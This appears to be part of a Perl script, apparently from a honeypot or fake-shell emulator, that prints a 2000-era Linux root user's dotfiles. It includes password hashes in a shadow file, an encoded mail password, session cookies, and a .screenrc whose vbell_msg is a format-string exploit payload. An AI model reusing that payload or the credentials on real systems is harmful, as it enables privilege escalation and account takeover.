 ICE   tcp/darkstar:1099 MIT-MAGIC-COOKIE-1 o��E�8�E�Eu�]� XSMP   tcp/darkstar:1099 MIT-MAGIC-COOKIE-1 9H����>||�K>7ꍜ ICE   "local/darkstar:/tmp/.ICE-unix/1180 MIT-MAGIC-COOKIE-1 y���:Y����vQ\$� XSMP   "local/darkstar:/tmp/.ICE-unix/1180 MIT-MAGIC-COOKIE-1 �
�'��گ%�X|�d0 ICE   tcp/darkstar:1284 MIT-MAGIC-COOKIE-1 �]0�e��T��WL&�� XSMP   tcp/darkstar:1284 MIT-MAGIC-COOKIE-1 f��V�lx;n�~�R� ICE   "local/darkstar:/tmp/.ICE-unix/2357 MIT-MAGIC-COOKIE-1 +o�!\?�A�YLDon�� XSMP   "local/darkstar:/tmp/.ICE-unix/2357 MIT-MAGIC-COOKIE-1 ��;ձ\X�!�t�x ICE   "local/localhost:/tmp/.ICE-unix/191 MIT-MAGIC-COOKIE-1 ؛c|�)yXM(:�� XSMP   "local/localhost:/tmp/.ICE-unix/191 MIT-MAGIC-COOKIE-1 K��1�\$zޭ�Pn�� ICE   tcp/localhost:1051 MIT-MAGIC-COOKIE-1 \@Cx�BB�UՀLz���c XSMP   tcp/localhost:1051 MIT-MAGIC-COOKIE-1 dyURg������hq� ICE   "local/localhost:/tmp/.ICE-unix/433 MIT-MAGIC-COOKIE-1 .�N�
���ۘN��o] XSMP   "local/localhost:/tmp/.ICE-unix/433 MIT-MAGIC-COOKIE-1 Žp���AUlf9�� ICE   tcp/localhost:1059 MIT-MAGIC-COOKIE-1 �*?\$)oq���X��" XSMP   tcp/localhost:1059 MIT-MAGIC-COOKIE-1 q]yⷍ̫��u�[ ICE   "local/localhost:/tmp/.ICE-unix/490 MIT-MAGIC-COOKIE-1 ����ܙ��`�[#,< XSMP   "local/localhost:/tmp/.ICE-unix/490 MIT-MAGIC-COOKIE-1 ����0�X�����w� ICE   tcp/localhost:1063 MIT-MAGIC-COOKIE-1 k�Ү��%4�M���w XSMP   tcp/localhost:1063 MIT-MAGIC-COOKIE-1 �#�-�� ��2��_�Z ICE   "local/localhost:/tmp/.ICE-unix/525 MIT-MAGIC-COOKIE-1 ���5�Oϰ��D3a XSMP   "local/localhost:/tmp/.ICE-unix/525 MIT-MAGIC-COOKIE-1 �Nm%��j�=��4Wz�/
EOT
}

sub cat_195
{
   # /root/.Xauthority
   print STDERR << "EOT"
EOT
}

sub cat_196
{
   # /root/.acrorc
   print STDERR << "EOT"
*PrefsVersion:	3
*OpenDialogAtStartup:	false
*ShowSplashAtStartup:	true
*ShowToolBar:	true
*RememberDialogs:	true
*DefaultOverviewType:	UseNone
*DefaultZoomScale:	1
*DefaultZoomType:	FitPage
*ShowLargeImages:	true
*GreekText:	true
*GreekLevel:	6
*SubstituteFontType:	0
*DoCalibratedColor:	true
*SkipWarnings:	false
*PSLevel:	2
*ShrinkToFit:	true
*CaseSensitive:	false
*WholeWords:	false
*NoteColor:	#ffffffff0000
*NoteLabel:	,,,
*MaxThreadZoom:	8
*EnablePageCache:	false
*FullScreenColor:	#000000000000
*FullScrolling:	false
*MaxPageCacheZoom:	2
*MinPageCacheTicks:	12
*MaxPageCacheBytes:	4194304
*DrawMissingThumbs:	false
*FullScreenChangeTimeDelay:	5
*FullScreenLoop:	false
EOT
}

sub cat_197
{
   # /root/.addressbook
   print STDERR << "EOT"
EOT
}

sub cat_198
{
   # /root/.addressbook.lu
   print STDERR << "EOT"
P#*E\@ 14        100
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
4294967295
EOT
}

sub cat_199
{
   # /root/.aumixrc
   print STDERR << "EOT"
vol:99:99:P
bass:100:100:P
treble:100:100:P
synth:100:100:P
pcm:100:100:P
speaker:75:75:P
line:100:100:P
mic:16:16:R
cd:75:75:P
mix:0:0:P
igain:100:100:P
ogain:100:100:P
EOT
}

sub cat_200
{
   # /root/.bash_history
   print STDERR << "EOT"
ls
ls
tar zxvf s9x.DanOSc5.116a.i386.tar.gz
ls
./ssnes9x
ldd ssnes9x
env
env GSVGAMODE=
ls
./ssnes9x
pico /etc/profile
exit
man klogd
clear
reset
man klogd
ps aux
top
whow
ls
exit
ls
cd /root
ls
netstat -na
lsof
lsof | grep raw
ls
cd /proc/net/tcp
cd /proc/net/
EOT
}

sub cat_201
{
   # /root/.blackboxrc
   print STDERR << "EOT"
session.screen0.workspaces:	1
session.screen0.windowPlacement:	SmartPlacement
session.screen0.focusModel:	SloppyFocus
session.screen0.slitPlacement:	CenterRight
session.screen0.strftimeFormat:	%I:%M %p
session.screen0.toolbarWidthPercent:	66
session.screen0.toolbarOnTop:	True
session.screen0.workspaceNames:	pcHazard
session.opaqueMove:	False
session.colorsPerChannel:	4
session.windowCycleModifier:	Mod1
session.autoRaiseDelay:	250
session.styleFile:	/usr/X11R6/share/Blackbox/styles/steelbox
session.menuFile:	/usr/X11R6/share/Blackbox/menu
session.imageDither:	True
session.workspaceChangeModifier:	Control
session.doubleClickInterval:	250
session.colormapFocusModel:	Click
EOT
}

sub cat_202
{
   # /root/.esd_auth
   print STDERR << "EOT"
��4���	�&��>g7
EOT
}

sub cat_203
{
   # /root/.esshshrc
   print STDERR << "EOT"
[esshsh]
Command=gnome-terminal --utmp -e "ssh -p %p %L %R %x -c %c %C -l %u %h"
Forward=ssh -p %p %L %R %x -c %c %C -l %u %h -f %f
PosX=25
PosY=25
SizeX=250
SizeY=300
Resolve=1
BgOne=57000,57000,57000
BgTwo=65535,65535,65535
RootColor=50000,0,0
ssh0=127.0.0.1;pcwiz;;22;idea;1;1;;
EOT
}

sub cat_204
{
   # /root/.fetchhost
   print STDERR << "EOT"
pop3.ig.com.br *>(/J:9KC>H2b '<H7P=IFb 300
EOT
}

sub cat_205
{
   # /root/.fishingboat
   print STDERR << "EOT"
EOT
}

sub cat_206
{
   # /root/.gtkrc
   print STDERR << "EOT"
# -- THEME AUTO-WRITTEN DO NOT EDIT
include "/usr/share/themes/Pixmap/gtk/gtkrc"

include "/root/.gtkrc.mine"

# -- THEME AUTO-WRITTEN DO NOT EDIT
EOT
}

sub cat_207
{
   # /root/.ircservers
   print STDERR << "EOT"
irc.brasnet.org
EOT
}

sub cat_208
{
   # /root/.kderc
   print STDERR << "EOT"
# KDE Config File
[KDE]
kfmIconStyle=Normal
contrast=7
widgetStyle=Windows 95
macStyle=off
kpanelIconStyle=Normal
KDEIconStyle=Normal
[Custom Colors]
Color8=192,192,192
Color9=192,192,192
Color10=192,192,192
Color11=192,192,192
Color12=192,192,192
Color13=192,192,192
Color14=192,192,192
Color15=192,192,192
Color16=192,192,192
Color17=192,192,192
Color0=192,192,192
Color1=192,192,192
Color2=192,192,192
Color3=192,192,192
Color4=192,192,192
Color5=192,192,192
Color6=192,192,192
Color7=192,192,192
[WM]
activeBlend=0,0,0
inactiveBackground=128,128,128
EOT
}

sub cat_209
{
   # /root/.kmid_collections
   print STDERR << "EOT"
EOT
}

sub cat_210
{
   # /root/.kss-install.pid.localhost
   print STDERR << "EOT"
158
EOT
}

sub cat_211
{
   # /root/.less
   print STDERR << "EOT"
 M+Gc" [B [A [6~ [5~ [1~ [4~ e  xEnd
EOT
}

sub cat_212
{
   # /root/.lesskey
   print STDERR << "EOT"
[B  	forw-line      
[A  	back-line     
[6~ 	forw-scroll
[5~  	back-scroll 
[1~  	goto-line
[4~  	goto-end
EOT
}

sub cat_213
{
   # /root/.lynx_cookies
   print STDERR << "EOT"
www.zipmail.com.br	FALSE	/	FALSE	986170687	zipmail	200.241.224.2.4760954634687470
redlight.com	FALSE	/	FALSE	1271283623	Apache	200.241.224.2.7720955923623143
busca.cade.com.br	FALSE	/	FALSE	2145801600	NGUserID	c8f48f96-138-956533419-1
www.evirgula.com.br	FALSE	/	FALSE	1009249200	123	ONDE=Evirgula
www.goto.com	FALSE	/	FALSE	1274918345	UserID	D343CBD637C6F3AF
.altavista.com	FALSE	/	FALSE	1388491200	AV_USERKEY	AVSdff9ecbf0c00001f0010ac0005c85
www.ebates.com	FALSE	/	FALSE	995430307	cookie_id	200.241.227.20020000718212507089
.tripod.com	FALSE	/	FALSE	995525726	CookieStatus	COOKIE_OK
.amazon.com	FALSE	/	FALSE	2082787201	ubid-main	077-5515370-1029960
.amazon.com	FALSE	/	FALSE	2082787201	x-main	eKQIfwnxuF7qtmM40x6VWAXh\@Ih6Uo5H
.portalnacional.com.br	FALSE	/	FALSE	2137622400	ID	79
.starmedia.com	FALSE	/	FALSE	1125697135	SMQUID	200.241.227.208.41162968017135804
.yahoo.com	FALSE	/	FALSE	1271361600	B	92v9e84stddq2&b=2&f=s
meusite.osite.com.br	FALSE	/	FALSE	1293753600	ELSITIO	200.241.235.11-2120462960.29371240
.uol.com.br	FALSE	/	FALSE	2147000000	UOL_VIS	B|200.241.235.52|971661482.54665|971661596
www.radaruol.com.br	FALSE	/	FALSE	1577844000	inkid	kVmcylGZhBCIgYh3pnTlhGAA6u5T
.iol.it	FALSE	/	FALSE	1044240606	Apache	200.241.235.52.1140397166460639
www.alfenas.psi.br	FALSE	/	FALSE	1293753600	RA01_ID	200.242.136.233-3154774384.29381296
www.pixeltech.com.au	FALSE	/	FALSE	981113457	entryID	15642
.vendercom.com	FALSE	/	FALSE	981055983	entryID	15642
.cnet.com	FALSE	/	FALSE	2145830400	aid	D8C8F7833A593F2D00044A7600001D59
.cnet.com	FALSE	/	FALSE	2145830400	s_cur_1_0	0101sisi0978927405752fd3Jx4+POyMerrJvGl6in2qHRn5fYnZ56a4Ln5crU5M7Rxq2roJ6UpqikpG0=
www.zdnet.co.uk	FALSE	/	FALSE	1294290050	Apache	200.242.136.216.269479789300511
EOT
}

sub cat_214
{
   # /root/.mh_profile
   print STDERR << "EOT"
Path: Mail
EOT
}

sub cat_215
{
   # /root/.midnightrc
   print STDERR << "EOT"
# Midnight file configuration
#
# this file is generated by the midnight midi player configuration system
#

#
/gmidnight/karaoke/font_name = -*-courier-*-*-*-*-24-*-*-*-*-*-*-*
#
/gmidnight/karaoke_bg_color/blue = 65535
#
/gmidnight/karaoke_bg_color/green = 65535
#
/gmidnight/karaoke_bg_color/red = 65535
#
/gmidnight/karaoke_fg_cur_color/blue = 0
#
/gmidnight/karaoke_fg_cur_color/green = 0
#
/gmidnight/karaoke_fg_cur_color/red = 65535
#
/gmidnight/karaoke_fg_read_color/blue = 32767
#
/gmidnight/karaoke_fg_read_color/green = 32767
#
/gmidnight/karaoke_fg_read_color/red = 32767
#
/gmidnight/karaoke_fg_unread_color/blue = 0
#
/gmidnight/karaoke_fg_unread_color/green = 0
#
EOT
}

sub cat_216
{
   # /root/.nessusrc
   print STDERR << "EOT"
# This file was automagically created by nessus
nessusd_host = 127.0.0.1
nessusd_user = teste
begin(SCANNER_SET)
 Ping the remote host = no
 TCP Ping the remote host = no
 TCP SYN scan = no
 FTP bounce scan = no
 Nmap tcp connect() scan = no
 Nmap = no
end(SCANNER_SET)

begin(SERVER_PREFS)
 plugins_folder = /usr/local/lib/nessus/plugins
 max_threads = 8
 logfile = /usr/local/var/nessus/nessusd.messages
 log_whole_attack = yes
 log_plugins_name_at_load = no
 dumpfile = /usr/local/var/nessus/nessusd.dump
 rules = /usr/local/etc/nessus/nessusd.rules
 users = /usr/local/etc/nessus/nessusd.users
 cgi_path = /cgi-bin
 port_range = 1-1
 optimize_test = yes
 language = english
 track_iothreads = yes
 cookie_logpipe = /usr/local/etc/nessus/nessusd.logpipe
 cookie_logpipe_suptmo = 2
 force_pubkey_auth = no
 checks_read_timeout = 15
EOT
}

sub cat_217
{
   # /root/.netwatch.0.9g
   print STDERR << "EOT"
EOT
}

sub cat_218
{
   # /root/.newsrc
   print STDERR << "EOT"
EOT
}

sub cat_219
{
   # /root/.newsrc-forums.inprise.com
   print STDERR << "EOT"
borland.public.delphi.internet: 1-43284,44364,44366,44377,44427,44448,44464,44471,44487,44522,44553,44562-44565,44575,44588,44634,44645,44697,44791,44795,44797,44800,44818,44845
borland.public.delphi.winapi: 1-101974,101989,102083,102084,102102,102405,102433,102668,102746,102842,103138,103146,103391,103404,103444,103486,103607,103608,103636,103679,103696,103717,103740,103993,104082,104088,104100,104124,104126,104155,104203,104228,104250,104258,104323,104341,104345,104363,104408,104425,104518,104579,104737,104830,104833,104846,104850,104858,104859,104895,104898,105089,105149,105206
EOT
}

sub cat_220
{
   # /root/.newsrc-news
   print STDERR << "EOT"
EOT
}

sub cat_221
{
   # /root/.pine-debug1
   print STDERR << "EOT"
Debug output of the Pine program (debug=2 debug_imap=0). Version 4.20
Thu Sep  7 09:26:27 2000

reading_pinerc "/usr/local/lib/pine.conf"
Open failed: No such file or directory
reading_pinerc "/root/.pinerc"
Read 13760 characters:
read_pinerc: pinerc_written = 968329496
reading_pinerc "/usr/local/lib/pine.conf.fixed"
Open failed: No such file or directory
======= Current_val options set =======
          user-domain : ig.com.br
          smtp-server : 127.0.0.1
           inbox-path : inbox
   folder-collections : mail/[]
          default-fcc : sent-mail
 default-saved-msg-fo : saved-messages
     postponed-folder : postponed-msgs
       mail-directory : mail
       signature-file : .signature
         address-book : .addressbook
          color-style : use-termdef
  saved-msg-name-rule : default-folder
        fcc-name-rule : default-fcc
             sort-key : arrival
   addrbook-sort-rule : fullname-with-lists-last
     folder-sort-rule : alphabetical
 composer-wrap-column : 74
  reply-indent-string : > 
         reply-leadin : default
EOT
}

sub cat_222
{
   # /root/.pine-debug2
   print STDERR << "EOT"
Debug output of the Pine program (debug=2 debug_imap=0). Version 4.20
Thu Sep  7 09:24:49 2000

reading_pinerc "/usr/local/lib/pine.conf"
Open failed: No such file or directory
reading_pinerc "/root/.pinerc"
Read 13760 characters:
read_pinerc: pinerc_written = 965737466
reading_pinerc "/usr/local/lib/pine.conf.fixed"
Open failed: No such file or directory
======= Current_val options set =======
          user-domain : ig.com.br
          smtp-server : 127.0.0.1
           inbox-path : inbox
   folder-collections : mail/[]
          default-fcc : sent-mail
 default-saved-msg-fo : saved-messages
     postponed-folder : postponed-msgs
       mail-directory : mail
       signature-file : .signature
         address-book : .addressbook
          color-style : use-termdef
  saved-msg-name-rule : default-folder
        fcc-name-rule : default-fcc
             sort-key : arrival
   addrbook-sort-rule : fullname-with-lists-last
     folder-sort-rule : alphabetical
 composer-wrap-column : 74
  reply-indent-string : > 
         reply-leadin : default
EOT
}

sub cat_223
{
   # /root/.pine-debug3
   print STDERR << "EOT"
Debug output of the Pine program (debug=2 debug_imap=0). Version 4.20
Sun Aug 20 13:23:34 2000

reading_pinerc "/usr/local/lib/pine.conf"
Open failed: No such file or directory
reading_pinerc "/root/.pinerc"
Read 13760 characters:
read_pinerc: pinerc_written = 965737466
reading_pinerc "/usr/local/lib/pine.conf.fixed"
Open failed: No such file or directory
======= Current_val options set =======
          user-domain : ig.com.br
          smtp-server : 127.0.0.1
           inbox-path : inbox
   folder-collections : mail/[]
          default-fcc : sent-mail
 default-saved-msg-fo : saved-messages
     postponed-folder : postponed-msgs
       mail-directory : mail
       signature-file : .signature
         address-book : .addressbook
          color-style : use-termdef
  saved-msg-name-rule : default-folder
        fcc-name-rule : default-fcc
             sort-key : arrival
   addrbook-sort-rule : fullname-with-lists-last
     folder-sort-rule : alphabetical
 composer-wrap-column : 74
  reply-indent-string : > 
         reply-leadin : default
EOT
}

sub cat_224
{
   # /root/.pine-debug4
   print STDERR << "EOT"
Debug output of the Pine program (debug=2 debug_imap=0). Version 4.20
Tue Aug  8 09:25:20 2000

reading_pinerc "/usr/local/lib/pine.conf"
Open failed: No such file or directory
reading_pinerc "/root/.pinerc"
Read 13760 characters:
read_pinerc: pinerc_written = 965737466
reading_pinerc "/usr/local/lib/pine.conf.fixed"
Open failed: No such file or directory
======= Current_val options set =======
          user-domain : ig.com.br
          smtp-server : 127.0.0.1
           inbox-path : inbox
   folder-collections : mail/[]
          default-fcc : sent-mail
 default-saved-msg-fo : saved-messages
     postponed-folder : postponed-msgs
       mail-directory : mail
       signature-file : .signature
         address-book : .addressbook
          color-style : use-termdef
  saved-msg-name-rule : default-folder
        fcc-name-rule : default-fcc
             sort-key : arrival
   addrbook-sort-rule : fullname-with-lists-last
     folder-sort-rule : alphabetical
 composer-wrap-column : 74
  reply-indent-string : > 
         reply-leadin : default
EOT
}

sub cat_225
{
   # /root/.pinerc
   print STDERR << "EOT"
# Updated by Pine(tm) 4.20, copyright 1989-1999 University of Washington.
#
# Pine configuration file -- customize as needed.
#
# This file sets the configuration options used by Pine and PC-Pine.  If you
# are using Pine on a Unix system, there may be a system-wide configuration
# file which sets the defaults for these variables.  There are comments in
# this file to explain each variable, but if you have questions about
# specific settings see the section on configuration options in the Pine
# notes.  On Unix, run pine -conf to see how system defaults have been set.
# For variables that accept multiple values, list elements are separated
# by commas.  A line beginning with a space or tab is considered to be a
# continuation of the previous line.  For a variable to be unset its value
# must be blank.  To set a variable to the empty string its value should
# be "".  You can override system defaults by setting a variable to the
# empty string.  Switch variables are set to either "yes" or "no", and
# default to "no".
# Lines beginning with "#" are comments, and ignored by Pine.


# Over-rides your full name from Unix password file. Required for PC-Pine.
personal-name=Vigilar Vigilancia Ltda.

# Sets domain part of From: and local addresses in outgoing mail.
user-domain=ig.com.br

# List of SMTP servers for sending mail. If blank: Unix Pine uses sendmail.
smtp-server=127.0.0.1

# NNTP server for posting news. Also sets news-collections for news reading.
EOT
}

sub cat_226
{
   # /root/.saves-261-localhost~
   print STDERR << "EOT"
EOT
}

sub cat_227
{
   # /root/.screenrc
   print STDERR << "EOT"
vbell on
vbell_msg '%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%.0d%n'
vbellwait 3600
EOT
}

sub cat_228
{
   # /root/.shad
   print STDERR << "EOT"
root:\$1\$0e18t0.c\$MmrqHzruR2wnYJZ0DYXR9.:11074:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
adm:*:9797:0:::::
lp:*:9797:0:::::
sync:*:9797:0:::::
shutdown:*:9797:0:::::
halt:*:9797:0:::::
mail:*:9797:0:::::
news:*:9797:0:::::
uucp:*:9797:0:::::
operator:*:9797:0:::::
games:*:9797:0:::::
ftp:*:9797:0:::::
gdm:*:9797:0:::::
nobody:*:9797:0:::::
pchaz:\$1\$1DG2t0Bl\$zNl6Nn83bSvzUVdwREnKG/:11074:0:99999:7:::
EOT
}

sub cat_229
{
   # /root/.studio.cfg
   print STDERR << "EOT"
ConfigSet File for the SharpeSound Studio
by Paul D. Sharpe; 3rd Year project
University of Leeds, 1994-1995
----------------------------------------------
{cFG1}	{blue}	{Label Text Colour}
{cFG2}	{black}	{Button Text Colour}
{FNT_S}	{-Adobe-Helvetica-Medium-R-Normal--*-100-*}	{Button Font}
{cFG3}	{blue}	{Editor Foreground Colour}
{cABG}	{LightGrey}	{Active Button Colour}
{fVw_PlayPanel}	{1}	{Flag for Viewing PlayPanel}
{cAFG}	{black}	{Active Button Text Colour}
{fVw_PlotBox}	{1}	{Flag for Viewing PlotBox}
{fVw_InfoBar}	{1}	{Flag for Viewing InfoBar}
{mnoshow}	{-1 -1 -1 -1 3 4 5 -1 -1 8 9 10 11 12}	{ Mixer Sliders Not to be shown }
{FNT_L}	{-Adobe-Helvetica-Medium-R-Normal--*-120-*}	{Label Font}
{REL}	{ridge}	{Border Type}
{fVw_EffectBar}	{1}	{Flag for Viewing EffectBar}
{fVw_MenuBar}	{1}	{Flag for Viewing MenuBar}
{cDFG}	{LightGrey}	{Disabled Button Text Colour}
{BDW}	{4}	{Border Width of Sections}
{cBG1}	{grey}	{Window Background Colour}
{cBG2}	{grey}	{Button Colour}
{fVw_Mixer}	{1}	{Flag for Viewing Mixer}
{cBG3}	{LightGrey}	{Editor Background Colour}
EOT
}

sub cat_230
{
   # /root/.tuxracer
   print STDERR << "EOT"
# Tux Racer 0.12.1 configuration file
#
# See the README file distributed with the program for
# descriptions of these parameters.
# Note: this file is parsed using Tcl, so Tcl syntax applies.
#
set data_dir "/usr/local/share/tuxracer"
set fullscreen false
set x_resolution 640
set y_resolution 480
set force_window_position true
set warp_pointer true
set control_mode 0
set quit_key "q escape"
set turn_left_key "j"
set turn_right_key "l"
set brake_key "space"
set paddle_key "k"
set above_view_key "1"
set behind_view_key "2"
set eye_view_key "3"
set screenshot_key "="
set pause_key "p"
set display_fps false
set tux_slides_on_belly true
set course_detail_level 125
set forward_clip_distance 100
set backward_clip_distance 10
set tree_detail_distance 20
set draw_tux_shadow false
EOT
}

sub cat_231
{
   # /root/.watchlog.000
   print STDERR << "EOT"
EOT
}

sub cat_232
{
   # /root/.winerc
   print STDERR << "EOT"
;;
;; MS-DOS drives configuration
;;
;; Each section has the following format:
;; [Drive X]
;; Path=xxx	  (Unix path for drive root)
;; Type=xxx	  (supported types are 'floppy', 'hd', 'cdrom' and 'network')
;; Label=xxx	  (drive label, at most 11 characters)
;; Serial=xxx	  (serial number, 8 characters hexadecimal number)
;; Filesystem=xxx (supported types are 'msdos'/'dos'/'fat', 'win95'/'vfat', 'unix')
;;   This is the FS Wine is supposed to emulate on a certain
;;   directory structure.
;;   Recommended:
;;   - "win95" for ext2fs, VFAT and FAT32
;;   - "msdos" for FAT16 (ugly, upgrading to VFAT driver strongly recommended)
;;   DON'T use "unix" unless you intend to port programs using Winelib !
;; Device=/dev/xx (only if you want to allow raw device access)
;;

;
;
; Floppy 'A' and 'B'
;
; OpenDanOS uses an automounter under /auto/, so we use that too.
;
[Drive A]
Path=/mnt/fw95/
Type=floppy
Label=Floppy
Serial=87654321
EOT
}

sub cat_233
{
   # /root/.winerc.bak
   print STDERR << "EOT"
;;
;; MS-DOS drives configuration
;;
;; Each section has the following format:
;; [Drive X]
;; Path=xxx       (Unix path for drive root)
;; Type=xxx       (supported types are 'floppy', 'hd', 'cdrom' and 'network')
;; Label=xxx      (drive label, at most 11 characters)
;; Serial=xxx     (serial number, 8 characters hexadecimal number)
;; Filesystem=xxx (supported types are 'msdos'/'dos'/'fat', 'win95'/'vfat', 'unix')
;;   This is the FS Wine is supposed to emulate on a certain
;;   directory structure.
;;   Recommended:
;;   - "win95" for ext2fs, VFAT and FAT32
;;   - "msdos" for FAT16 (ugly, upgrading to VFAT driver strongly recommended)
;;   DON'T use "unix" unless you intend to port programs using Winelib !
;; Device=/dev/xx (only if you want to allow raw device access)
;;

;
;
; Floppy 'A' and 'B'
;
; OpenDanOS uses an automounter under /auto/, so we use that too.
;
[Drive A]
Path=/auto/floppy/
Type=floppy
Label=Floppy
Serial=87654321
EOT
}

sub cat_234
{
   # /root/.winerc.old
   print STDERR << "EOT"
;;
;; MS-DOS drives configuration
;;
;; Each section has the following format:
;; [Drive X]
;; Path=xxx       (Unix path for drive root)
;; Type=xxx       (supported types are 'floppy', 'hd', 'cdrom' and 'network')
;; Label=xxx      (drive label, at most 11 characters)
;; Serial=xxx     (serial number, 8 characters hexadecimal number)
;; Filesystem=xxx (supported types are 'msdos'/'dos'/'fat', 'win95'/'vfat', 'unix')
;;   This is the FS Wine is supposed to emulate on a certain
;;   directory structure.
;;   Recommended:
;;   - "win95" for ext2fs, VFAT and FAT32
;;   - "msdos" for FAT16 (ugly, upgrading to VFAT driver strongly recommended)
;;   DON'T use "unix" unless you intend to port programs using Winelib !
;; Device=/dev/xx (only if you want to allow raw device access)
;;

;
;
; Floppy 'A' and 'B'
;
; OpenDanOS uses an automounter under /auto/, so we use that too.
;
[Drive A]
Path=/auto/floppy/
Type=floppy
Label=Floppy
Serial=87654321
EOT
}

sub cat_235
{
   # /root/.workmandb
   print STDERR << "EOT"
# WorkMan database file
tracks 1 150 4301
track DATA TRACK
tracks 11 183 19383 86250 118008 148008 174183 200883 210108 228333 249070 280720 3864
cdname Compositores
artist Mozart
track 
track 
track 
track 
track 
track 
track 
track 
track 
track 
track 
EOT
}

sub cat_236
{
   # /root/.workmanrc
   print STDERR << "EOT"
# WorkMan database file
tracks 1 150 4301
dontplay 1
tracks 11 183 19383 86250 118008 148008 174183 200883 210108 228333 249070 280720 3864
EOT
}

sub cat_237
{
   # /root/.xinitrc
   print STDERR << "EOT"
#!/bin/sh
# \$XConsortium: xinitrc.cpp,v 1.4 91/08/22 11:41:34 rws Exp \$

userresources=\$HOME/.Xresources
usermodmap=\$HOME/.Xmodmap
sysresources=/usr/X11R6/lib/X11/xinit/.Xresources
sysmodmap=/usr/X11R6/lib/X11/xinit/.Xmodmap

# merge in defaults and keymaps

if [ -f \$sysresources ]; then
    xrdb -merge \$sysresources
fi

if [ -f \$sysmodmap ]; then
    xmodmap \$sysmodmap
fi

if [ -f \$userresources ]; then
    xrdb -merge \$userresources
fi

if [ -f \$usermodmap ]; then
    xmodmap \$usermodmap
fi

wmsetbg /root/.blackbox/Backgrounds/needle.jpg
# Start the window manager:
exec /usr/X11R6/bin/blackbox
EOT
}

sub cat_238
{
   # /root/.xpilotrc
   print STDERR << "EOT"
xpilot.name:		Root
xpilot.power:		45.000
xpilot.turnSpeed:		12.000
xpilot.turnResistance:		0.118
xpilot.altPower:		14.706
xpilot.altTurnSpeed:		14.745
xpilot.altTurnResistance:		0.120
xpilot.speedFactHUD:		0.000
xpilot.speedFactPTR:		0.000
xpilot.fuelNotify:		500.000
xpilot.fuelWarning:		200.000
xpilot.fuelCritical:		100.000
xpilot.showShipName:		True
xpilot.showMineName:		True
xpilot.showMessages:		True
xpilot.showHUD:		True
xpilot.verticalHUDLine:		True
xpilot.horizontalHUDLine:		True
xpilot.fuelMeter:		True
xpilot.fuelGauge:		True
xpilot.turnSpeedMeter:		True
xpilot.powerMeter:		True
xpilot.packetSizeMeter:		True
xpilot.packetLossMeter:		True
xpilot.packetDropMeter:		True
xpilot.slidingRadar:		True
xpilot.showItems:		True
xpilot.showItemsTime:		2.000
xpilot.outlineWorld:		True
xpilot.filledWorld:		True
EOT
}

sub cat_239
{
   # /root/.xpilotrc.bak
   print STDERR << "EOT"
xpilot.name:		Root
xpilot.power:		45.000
xpilot.turnSpeed:		35.000
xpilot.turnResistance:		0.118
xpilot.altPower:		35.000
xpilot.altTurnSpeed:		25.000
xpilot.altTurnResistance:		0.120
xpilot.speedFactHUD:		0.000
xpilot.speedFactPTR:		0.000
xpilot.fuelNotify:		500.000
xpilot.fuelWarning:		200.000
xpilot.fuelCritical:		100.000
xpilot.showShipName:		True
xpilot.showMineName:		True
xpilot.showMessages:		True
xpilot.showHUD:		True
xpilot.verticalHUDLine:		True
xpilot.horizontalHUDLine:		True
xpilot.fuelMeter:		True
xpilot.fuelGauge:		True
xpilot.turnSpeedMeter:		True
xpilot.powerMeter:		True
xpilot.packetSizeMeter:		True
xpilot.packetLossMeter:		True
xpilot.packetDropMeter:		True
xpilot.slidingRadar:		True
xpilot.showItems:		True
xpilot.showItemsTime:		2.000
xpilot.outlineWorld:		True
xpilot.filledWorld:		True
EOT
}

sub cat_240
{
   # /root/.xsession-errors
   print STDERR << "EOT"
Where are you?

                 ___          ______
                /__/\     ___/_____/\          FrobTech, Inc.
                \  \ \   /         /\\
                 \  \ \_/__       /  \         "If you've got the job,
                 _\  \ \  /\_____/___ \         we've got the frob."
                // \__\/ /  \       /\ \
        _______//_______/    \     / _\/______
       /      / \       \    /    / /        /\
    __/      /   \       \  /    / /        / _\__
   / /      /     \_______\/    / /        / /   /\
  /_/______/___________________/ /________/ /___/  \
  \ \      \    ___________    \ \        \ \   \  /
   \_\      \  /          /\    \ \        \ \___\/
      \      \/          /  \    \ \        \  /
       \_____/          /    \    \ \________\/
            /__________/      \    \  /
            \   _____  \      /_____\/
             \ /    /\  \    / \  \ \
              /____/  \  \  /   \  \ \
              \    \  /___\/     \  \ \
               \____\/            \__\/
EOT
}

sub cat_241
{
   # /root/Lynx.trace
   print STDERR << "EOT"
		Lynx Trace Log (2.8.2rel.1)

LYNX_SIG_FILE set to '/root/.lynxsig'
Loading cfg file '/usr/lib/lynx/lynx.cfg'.
HTParse: aName:file://localhost/~/   relatedName:
HTParse:      result:localhost
HTParse: aName:file://localhost/~/   relatedName:
HTParse:      result:file
HTParse: aName:file://localhost/~/   relatedName:
1
HTParse:      result:file://localhost/~/
HTMLDTD: Copying DTD element info of size 5192, 118 * 44
HTMLSetCharacterHandling: LYRawMode changed OFF -> ON
LYLoadCookies: reading cookies from /root/.lynx_cookies
LYLoadCookies: tokenising www.zipmail.com.br	FALSE	/	FALSE	986170687	zipmail	200.241.224.2.4760954634687470
	0:0x8128bc0:0x814b348:[www.zipmail.com.br]
	1:0x8129ec4:0x814b35b:[FALSE]
	2:0x8128cc0:0x814b361:[/]
	3:0x8129ecc:0x814b363:[FALSE]
	4:0x8129ed4:0x814b369:[986170687]
	5:0x8128dc0:0x814b373:[zipmail]
	6:0x8128ec0:0x814b37b:[200.241.224.2.4760954634687470]
expires:	Sun Apr  1 21:18:07 2001

LYLoadCookies: tokenising redlight.com	FALSE	/	FALSE	1271283623	Apache	200.241.224.2.7720955923623143
	0:0x8128bc0:0x814b348:[redlight.com]
	1:0x8129ec4:0x814b355:[FALSE]
	2:0x8128cc0:0x814b35b:[/]
